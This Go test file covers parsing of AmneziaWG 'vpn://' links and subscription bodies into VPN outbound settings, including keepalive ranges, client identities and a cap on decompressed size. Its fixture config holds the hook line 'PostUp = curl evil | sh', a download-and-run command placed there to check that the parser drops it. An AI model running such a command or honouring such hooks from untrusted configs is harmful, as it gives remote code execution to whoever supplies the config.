package link

import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"reflect"
	"strings"
	"testing"
)

const awgConf = `[Interface]
PrivateKey = cPriv=
Address = 10.8.1.2/32, fd00::2/128
DNS = 1.1.1.1, 8.8.8.8
MTU = 1376
Jc = 4
Jmin = 10
Jmax = 50
S1 = 30
S2 = 40
H1 = 100-200
H2 = 300
H3 = 400
H4 = 500
I1 = <b 0xabc>
DisableCookies = on
PostUp = curl evil | sh

# my-awg
[Peer]
PublicKey = sPub=
PresharedKey = psk=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = awg.example.com:51820
PersistentKeepalive = 25`

func qCompressKey(t *testing.T, key any) string {
	t.Helper()
	js, err := json.Marshal(key)
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	_ = binary.Write(&buf, binary.BigEndian, uint32(len(js)))
	zw := zlib.NewWriter(&buf)
	_, _ = zw.Write(js)
	_ = zw.Close()
	return "vpn://" + base64.RawURLEncoding.EncodeToString(buf.Bytes())
}

func amneziaVPNKey(t *testing.T, conf string) string {
	t.Helper()
	last, _ := json.Marshal(map[string]string{"config": conf})
	return qCompressKey(t, map[string]any{
		"description":      "provider-de",
		"defaultContainer": "amnezia-awg",
		"containers":       []any{map[string]any{"container": "amnezia-awg", "awg": map[string]any{"last_config": string(last)}}},
	})
}

func TestParseAmneziaVPNLink(t *testing.T) {
	wantSettings := map[string]any{
		"secretKey": "cPriv=", "address": []string{"10.8.1.2/32", "fd00::2/128"}, "dns": "1.1.1.1",
		"mtu": 1376, "jc": 4, "jmin": 10, "jmax": 50, "s1": 30, "s2": 40,
		"h1": "100-200", "h2": "300", "h3": "400", "h4": "500", "i1": "<b 0xabc>",
		"randomTrailers": false, "disableCookies": true,
		"peers": []any{map[string]any{
			"publicKey": "sPub=", "presharedKey": "psk=", "allowedIPs": []string{"0.0.0.0/0", "::/0"},
			"endpoint": "awg.example.com:51820", "keepAlive": 25,
		}},
	}
	cases := []struct {
		name, link, wantTag string
	}{
		{"3x-ui plain conf", "vpn://" + base64.RawURLEncoding.EncodeToString([]byte(awgConf)), "my-awg"},
		{"AmneziaVPN app key", amneziaVPNKey(t, awgConf), "my-awg"},
		{"AmneziaVPN key without remark uses description", amneziaVPNKey(t, strings.Replace(awgConf, "# my-awg\n", "", 1)), "provider-de"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			res, err := ParseLink(c.link)
			if err != nil {
				t.Fatalf("ParseLink: %v", err)
			}
			if res.Outbound["protocol"] != "amneziawg" || res.Outbound["tag"] != c.wantTag {
				t.Fatalf("protocol/tag = %v/%v, want amneziawg/%s", res.Outbound["protocol"], res.Outbound["tag"], c.wantTag)
			}
			if got := res.Outbound["settings"]; !reflect.DeepEqual(got, wantSettings) {
				t.Fatalf("settings =\n%#v\nwant\n%#v", got, wantSettings)
			}
			if res.Identity != "amneziawg:cPriv=:sPub=@awg.example.com:51820" {
				t.Fatalf("identity = %q", res.Identity)
			}
		})
	}
}

// 3x-ui exports a ranged keepalive ("20-30"); dropping it would turn keepalive off.
func TestParseAmneziaVPNLinkRangedKeepaliveKeepsLowerBound(t *testing.T) {
	conf := strings.Replace(awgConf, "PersistentKeepalive = 25", "PersistentKeepalive = 20-30", 1)
	res, err := ParseLink("vpn://" + base64.RawURLEncoding.EncodeToString([]byte(conf)))
	if err != nil {
		t.Fatal(err)
	}
	peer := res.Outbound["settings"].(map[string]any)["peers"].([]any)[0].(map[string]any)
	if peer["keepAlive"] != 20 {
		t.Fatalf("keepAlive = %v, want 20", peer["keepAlive"])
	}
}

// Two clients of one server must keep distinct identities, or reordering them swaps tags.
func TestParseAmneziaVPNLinkIdentityTellsClientsApart(t *testing.T) {
	a, _ := ParseLink("vpn://" + base64.RawURLEncoding.EncodeToString([]byte(awgConf)))
	b, _ := ParseLink("vpn://" + base64.RawURLEncoding.EncodeToString([]byte(strings.Replace(awgConf, "cPriv=", "otherPriv=", 1))))
	if a == nil || b == nil || a.Identity == b.Identity {
		t.Fatalf("identities %v / %v, want two distinct", a, b)
	}
}

// Each key is capped at 1 MiB, but 2000 such keys would expand an 8 MiB body to 2 GB.
func TestParseSubscriptionBodyCapsTotalInflatedBytes(t *testing.T) {
	last, _ := json.Marshal(map[string]string{"config": awgConf})
	key := qCompressKey(t, map[string]any{
		"description": strings.Repeat("a", 900_000),
		"containers":  []any{map[string]any{"awg": map[string]any{"last_config": string(last)}}},
	})
	obs, _, err := ParseSubscriptionBody([]byte(strings.Repeat(key+"\n", 20)))
	if err != nil {
		t.Fatal(err)
	}
	if len(obs) != 9 {
		t.Fatalf("parsed %d keys of ~900 KB each, want 9 within the 8 MiB inflate budget", len(obs))
	}
}

func TestParseAmneziaVPNLinkRejects(t *testing.T) {
	cases := map[string]string{
		"key without awg container": qCompressKey(t, map[string]any{
			"containers": []any{map[string]any{"container": "amnezia-openvpn", "openvpn": map[string]any{"last_config": "{}"}}},
		}),
		"conf without endpoint": "vpn://" + base64.RawURLEncoding.EncodeToString([]byte("[Interface]\nPrivateKey = k\n[Peer]\nPublicKey = p")),
	}
	for name, l := range cases {
		t.Run(name, func(t *testing.T) {
			if res, err := ParseLink(l); err == nil {
				t.Fatalf("ParseLink accepted it: %#v", res.Outbound)
			}
		})
	}
}
